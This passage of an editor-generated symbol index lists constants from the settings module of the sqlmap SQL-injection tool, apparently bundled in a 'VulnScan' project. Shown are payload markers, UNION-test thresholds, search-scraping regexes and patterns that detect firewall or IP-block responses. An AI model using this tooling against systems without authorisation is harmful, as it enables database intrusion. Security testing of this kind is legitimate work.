        "peekOfCode": "RANDOM_INTEGER_MARKER = \"[RANDINT]\"\nRANDOM_STRING_MARKER = \"[RANDSTR]\"\nSLEEP_TIME_MARKER = \"[SLEEPTIME]\"\nINFERENCE_MARKER = \"[INFERENCE]\"\nSINGLE_QUOTE_MARKER = \"[SINGLE_QUOTE]\"\nGENERIC_SQL_COMMENT_MARKER = \"[GENERIC_SQL_COMMENT]\"\nPAYLOAD_DELIMITER = \"__PAYLOAD_DELIMITER__\"\nCHAR_INFERENCE_MARK = \"%c\"\nPRINTABLE_CHAR_REGEX = r\"[^\\x00-\\x1f\\x7f-\\xff]\"\n# Regular expression used for extraction of table names (useful for (e.g.) MsAccess)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RANDOM_STRING_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "RANDOM_STRING_MARKER = \"[RANDSTR]\"\nSLEEP_TIME_MARKER = \"[SLEEPTIME]\"\nINFERENCE_MARKER = \"[INFERENCE]\"\nSINGLE_QUOTE_MARKER = \"[SINGLE_QUOTE]\"\nGENERIC_SQL_COMMENT_MARKER = \"[GENERIC_SQL_COMMENT]\"\nPAYLOAD_DELIMITER = \"__PAYLOAD_DELIMITER__\"\nCHAR_INFERENCE_MARK = \"%c\"\nPRINTABLE_CHAR_REGEX = r\"[^\\x00-\\x1f\\x7f-\\xff]\"\n# Regular expression used for extraction of table names (useful for (e.g.) MsAccess)\nSELECT_FROM_TABLE_REGEX = r\"\\bSELECT\\b.+?\\bFROM\\s+(?P<result>([\\w.]|`[^`<>]+`)+)\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SLEEP_TIME_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SLEEP_TIME_MARKER = \"[SLEEPTIME]\"\nINFERENCE_MARKER = \"[INFERENCE]\"\nSINGLE_QUOTE_MARKER = \"[SINGLE_QUOTE]\"\nGENERIC_SQL_COMMENT_MARKER = \"[GENERIC_SQL_COMMENT]\"\nPAYLOAD_DELIMITER = \"__PAYLOAD_DELIMITER__\"\nCHAR_INFERENCE_MARK = \"%c\"\nPRINTABLE_CHAR_REGEX = r\"[^\\x00-\\x1f\\x7f-\\xff]\"\n# Regular expression used for extraction of table names (useful for (e.g.) MsAccess)\nSELECT_FROM_TABLE_REGEX = r\"\\bSELECT\\b.+?\\bFROM\\s+(?P<result>([\\w.]|`[^`<>]+`)+)\"\n# Regular expression used for recognition of textual content-type",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INFERENCE_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "INFERENCE_MARKER = \"[INFERENCE]\"\nSINGLE_QUOTE_MARKER = \"[SINGLE_QUOTE]\"\nGENERIC_SQL_COMMENT_MARKER = \"[GENERIC_SQL_COMMENT]\"\nPAYLOAD_DELIMITER = \"__PAYLOAD_DELIMITER__\"\nCHAR_INFERENCE_MARK = \"%c\"\nPRINTABLE_CHAR_REGEX = r\"[^\\x00-\\x1f\\x7f-\\xff]\"\n# Regular expression used for extraction of table names (useful for (e.g.) MsAccess)\nSELECT_FROM_TABLE_REGEX = r\"\\bSELECT\\b.+?\\bFROM\\s+(?P<result>([\\w.]|`[^`<>]+`)+)\"\n# Regular expression used for recognition of textual content-type\nTEXT_CONTENT_TYPE_REGEX = r\"(?i)(text|form|message|xml|javascript|ecmascript|json)\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SINGLE_QUOTE_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SINGLE_QUOTE_MARKER = \"[SINGLE_QUOTE]\"\nGENERIC_SQL_COMMENT_MARKER = \"[GENERIC_SQL_COMMENT]\"\nPAYLOAD_DELIMITER = \"__PAYLOAD_DELIMITER__\"\nCHAR_INFERENCE_MARK = \"%c\"\nPRINTABLE_CHAR_REGEX = r\"[^\\x00-\\x1f\\x7f-\\xff]\"\n# Regular expression used for extraction of table names (useful for (e.g.) MsAccess)\nSELECT_FROM_TABLE_REGEX = r\"\\bSELECT\\b.+?\\bFROM\\s+(?P<result>([\\w.]|`[^`<>]+`)+)\"\n# Regular expression used for recognition of textual content-type\nTEXT_CONTENT_TYPE_REGEX = r\"(?i)(text|form|message|xml|javascript|ecmascript|json)\"\n# Regular expression used for recognition of generic permission messages",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GENERIC_SQL_COMMENT_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "GENERIC_SQL_COMMENT_MARKER = \"[GENERIC_SQL_COMMENT]\"\nPAYLOAD_DELIMITER = \"__PAYLOAD_DELIMITER__\"\nCHAR_INFERENCE_MARK = \"%c\"\nPRINTABLE_CHAR_REGEX = r\"[^\\x00-\\x1f\\x7f-\\xff]\"\n# Regular expression used for extraction of table names (useful for (e.g.) MsAccess)\nSELECT_FROM_TABLE_REGEX = r\"\\bSELECT\\b.+?\\bFROM\\s+(?P<result>([\\w.]|`[^`<>]+`)+)\"\n# Regular expression used for recognition of textual content-type\nTEXT_CONTENT_TYPE_REGEX = r\"(?i)(text|form|message|xml|javascript|ecmascript|json)\"\n# Regular expression used for recognition of generic permission messages\nPERMISSION_DENIED_REGEX = r\"(?P<result>(command|permission|access)\\s*(was|is)?\\s*denied)\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PAYLOAD_DELIMITER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PAYLOAD_DELIMITER = \"__PAYLOAD_DELIMITER__\"\nCHAR_INFERENCE_MARK = \"%c\"\nPRINTABLE_CHAR_REGEX = r\"[^\\x00-\\x1f\\x7f-\\xff]\"\n# Regular expression used for extraction of table names (useful for (e.g.) MsAccess)\nSELECT_FROM_TABLE_REGEX = r\"\\bSELECT\\b.+?\\bFROM\\s+(?P<result>([\\w.]|`[^`<>]+`)+)\"\n# Regular expression used for recognition of textual content-type\nTEXT_CONTENT_TYPE_REGEX = r\"(?i)(text|form|message|xml|javascript|ecmascript|json)\"\n# Regular expression used for recognition of generic permission messages\nPERMISSION_DENIED_REGEX = r\"(?P<result>(command|permission|access)\\s*(was|is)?\\s*denied)\"\n# Regular expression used in recognition of generic protection mechanisms",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CHAR_INFERENCE_MARK",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CHAR_INFERENCE_MARK = \"%c\"\nPRINTABLE_CHAR_REGEX = r\"[^\\x00-\\x1f\\x7f-\\xff]\"\n# Regular expression used for extraction of table names (useful for (e.g.) MsAccess)\nSELECT_FROM_TABLE_REGEX = r\"\\bSELECT\\b.+?\\bFROM\\s+(?P<result>([\\w.]|`[^`<>]+`)+)\"\n# Regular expression used for recognition of textual content-type\nTEXT_CONTENT_TYPE_REGEX = r\"(?i)(text|form|message|xml|javascript|ecmascript|json)\"\n# Regular expression used for recognition of generic permission messages\nPERMISSION_DENIED_REGEX = r\"(?P<result>(command|permission|access)\\s*(was|is)?\\s*denied)\"\n# Regular expression used in recognition of generic protection mechanisms\nGENERIC_PROTECTION_REGEX = r\"(?i)\\b(rejected|blocked|protection|incident|denied|detected|dangerous|firewall)\\b\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PRINTABLE_CHAR_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PRINTABLE_CHAR_REGEX = r\"[^\\x00-\\x1f\\x7f-\\xff]\"\n# Regular expression used for extraction of table names (useful for (e.g.) MsAccess)\nSELECT_FROM_TABLE_REGEX = r\"\\bSELECT\\b.+?\\bFROM\\s+(?P<result>([\\w.]|`[^`<>]+`)+)\"\n# Regular expression used for recognition of textual content-type\nTEXT_CONTENT_TYPE_REGEX = r\"(?i)(text|form|message|xml|javascript|ecmascript|json)\"\n# Regular expression used for recognition of generic permission messages\nPERMISSION_DENIED_REGEX = r\"(?P<result>(command|permission|access)\\s*(was|is)?\\s*denied)\"\n# Regular expression used in recognition of generic protection mechanisms\nGENERIC_PROTECTION_REGEX = r\"(?i)\\b(rejected|blocked|protection|incident|denied|detected|dangerous|firewall)\\b\"\n# Regular expression used to detect errors in fuzz(y) UNION test",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SELECT_FROM_TABLE_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SELECT_FROM_TABLE_REGEX = r\"\\bSELECT\\b.+?\\bFROM\\s+(?P<result>([\\w.]|`[^`<>]+`)+)\"\n# Regular expression used for recognition of textual content-type\nTEXT_CONTENT_TYPE_REGEX = r\"(?i)(text|form|message|xml|javascript|ecmascript|json)\"\n# Regular expression used for recognition of generic permission messages\nPERMISSION_DENIED_REGEX = r\"(?P<result>(command|permission|access)\\s*(was|is)?\\s*denied)\"\n# Regular expression used in recognition of generic protection mechanisms\nGENERIC_PROTECTION_REGEX = r\"(?i)\\b(rejected|blocked|protection|incident|denied|detected|dangerous|firewall)\\b\"\n# Regular expression used to detect errors in fuzz(y) UNION test\nFUZZ_UNION_ERROR_REGEX = r\"(?i)data\\s?type|comparable|compatible|conversion|converting|failed|error\"\n# Upper threshold for starting the fuzz(y) UNION test",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "TEXT_CONTENT_TYPE_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "TEXT_CONTENT_TYPE_REGEX = r\"(?i)(text|form|message|xml|javascript|ecmascript|json)\"\n# Regular expression used for recognition of generic permission messages\nPERMISSION_DENIED_REGEX = r\"(?P<result>(command|permission|access)\\s*(was|is)?\\s*denied)\"\n# Regular expression used in recognition of generic protection mechanisms\nGENERIC_PROTECTION_REGEX = r\"(?i)\\b(rejected|blocked|protection|incident|denied|detected|dangerous|firewall)\\b\"\n# Regular expression used to detect errors in fuzz(y) UNION test\nFUZZ_UNION_ERROR_REGEX = r\"(?i)data\\s?type|comparable|compatible|conversion|converting|failed|error\"\n# Upper threshold for starting the fuzz(y) UNION test\nFUZZ_UNION_MAX_COLUMNS = 10\n# Regular expression used for recognition of generic maximum connection messages",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PERMISSION_DENIED_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PERMISSION_DENIED_REGEX = r\"(?P<result>(command|permission|access)\\s*(was|is)?\\s*denied)\"\n# Regular expression used in recognition of generic protection mechanisms\nGENERIC_PROTECTION_REGEX = r\"(?i)\\b(rejected|blocked|protection|incident|denied|detected|dangerous|firewall)\\b\"\n# Regular expression used to detect errors in fuzz(y) UNION test\nFUZZ_UNION_ERROR_REGEX = r\"(?i)data\\s?type|comparable|compatible|conversion|converting|failed|error\"\n# Upper threshold for starting the fuzz(y) UNION test\nFUZZ_UNION_MAX_COLUMNS = 10\n# Regular expression used for recognition of generic maximum connection messages\nMAX_CONNECTIONS_REGEX = r\"\\bmax.{1,100}\\bconnection\"\n# Maximum consecutive connection errors before asking the user if he wants to continue",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GENERIC_PROTECTION_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "GENERIC_PROTECTION_REGEX = r\"(?i)\\b(rejected|blocked|protection|incident|denied|detected|dangerous|firewall)\\b\"\n# Regular expression used to detect errors in fuzz(y) UNION test\nFUZZ_UNION_ERROR_REGEX = r\"(?i)data\\s?type|comparable|compatible|conversion|converting|failed|error\"\n# Upper threshold for starting the fuzz(y) UNION test\nFUZZ_UNION_MAX_COLUMNS = 10\n# Regular expression used for recognition of generic maximum connection messages\nMAX_CONNECTIONS_REGEX = r\"\\bmax.{1,100}\\bconnection\"\n# Maximum consecutive connection errors before asking the user if he wants to continue\nMAX_CONSECUTIVE_CONNECTION_ERRORS = 15\n# Timeout before the pre-connection candidate is being disposed (because of high probability that the web server will reset it)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FUZZ_UNION_ERROR_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "FUZZ_UNION_ERROR_REGEX = r\"(?i)data\\s?type|comparable|compatible|conversion|converting|failed|error\"\n# Upper threshold for starting the fuzz(y) UNION test\nFUZZ_UNION_MAX_COLUMNS = 10\n# Regular expression used for recognition of generic maximum connection messages\nMAX_CONNECTIONS_REGEX = r\"\\bmax.{1,100}\\bconnection\"\n# Maximum consecutive connection errors before asking the user if he wants to continue\nMAX_CONSECUTIVE_CONNECTION_ERRORS = 15\n# Timeout before the pre-connection candidate is being disposed (because of high probability that the web server will reset it)\nPRECONNECT_CANDIDATE_TIMEOUT = 10\n# Servers known to cause issue with pre-connection mechanism (because of lack of multi-threaded support)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FUZZ_UNION_MAX_COLUMNS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "FUZZ_UNION_MAX_COLUMNS = 10\n# Regular expression used for recognition of generic maximum connection messages\nMAX_CONNECTIONS_REGEX = r\"\\bmax.{1,100}\\bconnection\"\n# Maximum consecutive connection errors before asking the user if he wants to continue\nMAX_CONSECUTIVE_CONNECTION_ERRORS = 15\n# Timeout before the pre-connection candidate is being disposed (because of high probability that the web server will reset it)\nPRECONNECT_CANDIDATE_TIMEOUT = 10\n# Servers known to cause issue with pre-connection mechanism (because of lack of multi-threaded support)\nPRECONNECT_INCOMPATIBLE_SERVERS = (\"SimpleHTTP\", \"BaseHTTP\")\n# Identify WAF/IPS inside limited number of responses (Note: for optimization purposes)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_CONNECTIONS_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_CONNECTIONS_REGEX = r\"\\bmax.{1,100}\\bconnection\"\n# Maximum consecutive connection errors before asking the user if he wants to continue\nMAX_CONSECUTIVE_CONNECTION_ERRORS = 15\n# Timeout before the pre-connection candidate is being disposed (because of high probability that the web server will reset it)\nPRECONNECT_CANDIDATE_TIMEOUT = 10\n# Servers known to cause issue with pre-connection mechanism (because of lack of multi-threaded support)\nPRECONNECT_INCOMPATIBLE_SERVERS = (\"SimpleHTTP\", \"BaseHTTP\")\n# Identify WAF/IPS inside limited number of responses (Note: for optimization purposes)\nIDENTYWAF_PARSE_LIMIT = 10\n# Maximum sleep time in \"Murphy\" (testing) mode",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_CONSECUTIVE_CONNECTION_ERRORS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_CONSECUTIVE_CONNECTION_ERRORS = 15\n# Timeout before the pre-connection candidate is being disposed (because of high probability that the web server will reset it)\nPRECONNECT_CANDIDATE_TIMEOUT = 10\n# Servers known to cause issue with pre-connection mechanism (because of lack of multi-threaded support)\nPRECONNECT_INCOMPATIBLE_SERVERS = (\"SimpleHTTP\", \"BaseHTTP\")\n# Identify WAF/IPS inside limited number of responses (Note: for optimization purposes)\nIDENTYWAF_PARSE_LIMIT = 10\n# Maximum sleep time in \"Murphy\" (testing) mode\nMAX_MURPHY_SLEEP_TIME = 3\n# Regular expression used for extracting results from Google search",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PRECONNECT_CANDIDATE_TIMEOUT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PRECONNECT_CANDIDATE_TIMEOUT = 10\n# Servers known to cause issue with pre-connection mechanism (because of lack of multi-threaded support)\nPRECONNECT_INCOMPATIBLE_SERVERS = (\"SimpleHTTP\", \"BaseHTTP\")\n# Identify WAF/IPS inside limited number of responses (Note: for optimization purposes)\nIDENTYWAF_PARSE_LIMIT = 10\n# Maximum sleep time in \"Murphy\" (testing) mode\nMAX_MURPHY_SLEEP_TIME = 3\n# Regular expression used for extracting results from Google search\nGOOGLE_REGEX = r\"webcache\\.googleusercontent\\.com/search\\?q=cache:[^:]+:([^+]+)\\+&amp;cd=|url\\?\\w+=((?![^>]+webcache\\.googleusercontent\\.com)http[^>]+)&(sa=U|rct=j)\"\n# Google Search consent cookie",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PRECONNECT_INCOMPATIBLE_SERVERS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PRECONNECT_INCOMPATIBLE_SERVERS = (\"SimpleHTTP\", \"BaseHTTP\")\n# Identify WAF/IPS inside limited number of responses (Note: for optimization purposes)\nIDENTYWAF_PARSE_LIMIT = 10\n# Maximum sleep time in \"Murphy\" (testing) mode\nMAX_MURPHY_SLEEP_TIME = 3\n# Regular expression used for extracting results from Google search\nGOOGLE_REGEX = r\"webcache\\.googleusercontent\\.com/search\\?q=cache:[^:]+:([^+]+)\\+&amp;cd=|url\\?\\w+=((?![^>]+webcache\\.googleusercontent\\.com)http[^>]+)&(sa=U|rct=j)\"\n# Google Search consent cookie\nGOOGLE_CONSENT_COOKIE = \"CONSENT=YES+shp.gws-%s-0-RC1.%s+FX+740\" % (time.strftime(\"%Y%m%d\"), \"\".join(random.sample(string.ascii_lowercase, 2)))\n# Regular expression used for extracting results from DuckDuckGo search",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IDENTYWAF_PARSE_LIMIT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "IDENTYWAF_PARSE_LIMIT = 10\n# Maximum sleep time in \"Murphy\" (testing) mode\nMAX_MURPHY_SLEEP_TIME = 3\n# Regular expression used for extracting results from Google search\nGOOGLE_REGEX = r\"webcache\\.googleusercontent\\.com/search\\?q=cache:[^:]+:([^+]+)\\+&amp;cd=|url\\?\\w+=((?![^>]+webcache\\.googleusercontent\\.com)http[^>]+)&(sa=U|rct=j)\"\n# Google Search consent cookie\nGOOGLE_CONSENT_COOKIE = \"CONSENT=YES+shp.gws-%s-0-RC1.%s+FX+740\" % (time.strftime(\"%Y%m%d\"), \"\".join(random.sample(string.ascii_lowercase, 2)))\n# Regular expression used for extracting results from DuckDuckGo search\nDUCKDUCKGO_REGEX = r'<a class=\"result__url\" href=\"(htt[^\"]+)'\n# Regular expression used for extracting results from Bing search",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_MURPHY_SLEEP_TIME",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_MURPHY_SLEEP_TIME = 3\n# Regular expression used for extracting results from Google search\nGOOGLE_REGEX = r\"webcache\\.googleusercontent\\.com/search\\?q=cache:[^:]+:([^+]+)\\+&amp;cd=|url\\?\\w+=((?![^>]+webcache\\.googleusercontent\\.com)http[^>]+)&(sa=U|rct=j)\"\n# Google Search consent cookie\nGOOGLE_CONSENT_COOKIE = \"CONSENT=YES+shp.gws-%s-0-RC1.%s+FX+740\" % (time.strftime(\"%Y%m%d\"), \"\".join(random.sample(string.ascii_lowercase, 2)))\n# Regular expression used for extracting results from DuckDuckGo search\nDUCKDUCKGO_REGEX = r'<a class=\"result__url\" href=\"(htt[^\"]+)'\n# Regular expression used for extracting results from Bing search\nBING_REGEX = r'<h2><a href=\"([^\"]+)\" h='\n# Dummy user agent for search (if default one returns different results)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GOOGLE_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "GOOGLE_REGEX = r\"webcache\\.googleusercontent\\.com/search\\?q=cache:[^:]+:([^+]+)\\+&amp;cd=|url\\?\\w+=((?![^>]+webcache\\.googleusercontent\\.com)http[^>]+)&(sa=U|rct=j)\"\n# Google Search consent cookie\nGOOGLE_CONSENT_COOKIE = \"CONSENT=YES+shp.gws-%s-0-RC1.%s+FX+740\" % (time.strftime(\"%Y%m%d\"), \"\".join(random.sample(string.ascii_lowercase, 2)))\n# Regular expression used for extracting results from DuckDuckGo search\nDUCKDUCKGO_REGEX = r'<a class=\"result__url\" href=\"(htt[^\"]+)'\n# Regular expression used for extracting results from Bing search\nBING_REGEX = r'<h2><a href=\"([^\"]+)\" h='\n# Dummy user agent for search (if default one returns different results)\nDUMMY_SEARCH_USER_AGENT = \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0\"\n# Regular expression used for extracting content from \"textual\" tags",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GOOGLE_CONSENT_COOKIE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "GOOGLE_CONSENT_COOKIE = \"CONSENT=YES+shp.gws-%s-0-RC1.%s+FX+740\" % (time.strftime(\"%Y%m%d\"), \"\".join(random.sample(string.ascii_lowercase, 2)))\n# Regular expression used for extracting results from DuckDuckGo search\nDUCKDUCKGO_REGEX = r'<a class=\"result__url\" href=\"(htt[^\"]+)'\n# Regular expression used for extracting results from Bing search\nBING_REGEX = r'<h2><a href=\"([^\"]+)\" h='\n# Dummy user agent for search (if default one returns different results)\nDUMMY_SEARCH_USER_AGENT = \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0\"\n# Regular expression used for extracting content from \"textual\" tags\nTEXT_TAG_REGEX = r\"(?si)<(abbr|acronym|b|blockquote|br|center|cite|code|dt|em|font|h\\d|i|li|p|pre|q|strong|sub|sup|td|th|title|tt|u)(?!\\w).*?>(?P<result>[^<]+)\"\n# Regular expression used for recognition of IP addresses",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DUCKDUCKGO_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DUCKDUCKGO_REGEX = r'<a class=\"result__url\" href=\"(htt[^\"]+)'\n# Regular expression used for extracting results from Bing search\nBING_REGEX = r'<h2><a href=\"([^\"]+)\" h='\n# Dummy user agent for search (if default one returns different results)\nDUMMY_SEARCH_USER_AGENT = \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0\"\n# Regular expression used for extracting content from \"textual\" tags\nTEXT_TAG_REGEX = r\"(?si)<(abbr|acronym|b|blockquote|br|center|cite|code|dt|em|font|h\\d|i|li|p|pre|q|strong|sub|sup|td|th|title|tt|u)(?!\\w).*?>(?P<result>[^<]+)\"\n# Regular expression used for recognition of IP addresses\nIP_ADDRESS_REGEX = r\"\\b(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\b\"\n# Regular expression used for recognition of generic \"your ip has been blocked\" messages",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BING_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "BING_REGEX = r'<h2><a href=\"([^\"]+)\" h='\n# Dummy user agent for search (if default one returns different results)\nDUMMY_SEARCH_USER_AGENT = \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0\"\n# Regular expression used for extracting content from \"textual\" tags\nTEXT_TAG_REGEX = r\"(?si)<(abbr|acronym|b|blockquote|br|center|cite|code|dt|em|font|h\\d|i|li|p|pre|q|strong|sub|sup|td|th|title|tt|u)(?!\\w).*?>(?P<result>[^<]+)\"\n# Regular expression used for recognition of IP addresses\nIP_ADDRESS_REGEX = r\"\\b(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\b\"\n# Regular expression used for recognition of generic \"your ip has been blocked\" messages\nBLOCKED_IP_REGEX = r\"(?i)(\\A|\\b)ip\\b.*\\b(banned|blocked|block list|firewall)\"\n# Dumping characters used in GROUP_CONCAT MySQL technique",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DUMMY_SEARCH_USER_AGENT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DUMMY_SEARCH_USER_AGENT = \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0\"\n# Regular expression used for extracting content from \"textual\" tags\nTEXT_TAG_REGEX = r\"(?si)<(abbr|acronym|b|blockquote|br|center|cite|code|dt|em|font|h\\d|i|li|p|pre|q|strong|sub|sup|td|th|title|tt|u)(?!\\w).*?>(?P<result>[^<]+)\"\n# Regular expression used for recognition of IP addresses\nIP_ADDRESS_REGEX = r\"\\b(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\b\"\n# Regular expression used for recognition of generic \"your ip has been blocked\" messages\nBLOCKED_IP_REGEX = r\"(?i)(\\A|\\b)ip\\b.*\\b(banned|blocked|block list|firewall)\"\n# Dumping characters used in GROUP_CONCAT MySQL technique\nCONCAT_ROW_DELIMITER = ','\nCONCAT_VALUE_DELIMITER = '|'",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "TEXT_TAG_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "TEXT_TAG_REGEX = r\"(?si)<(abbr|acronym|b|blockquote|br|center|cite|code|dt|em|font|h\\d|i|li|p|pre|q|strong|sub|sup|td|th|title|tt|u)(?!\\w).*?>(?P<result>[^<]+)\"\n# Regular expression used for recognition of IP addresses\nIP_ADDRESS_REGEX = r\"\\b(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\b\"\n# Regular expression used for recognition of generic \"your ip has been blocked\" messages\nBLOCKED_IP_REGEX = r\"(?i)(\\A|\\b)ip\\b.*\\b(banned|blocked|block list|firewall)\"\n# Dumping characters used in GROUP_CONCAT MySQL technique\nCONCAT_ROW_DELIMITER = ','\nCONCAT_VALUE_DELIMITER = '|'\n# Coefficient used for a time-based query delay checking (must be >= 7)\nTIME_STDEV_COEFF = 7",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IP_ADDRESS_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
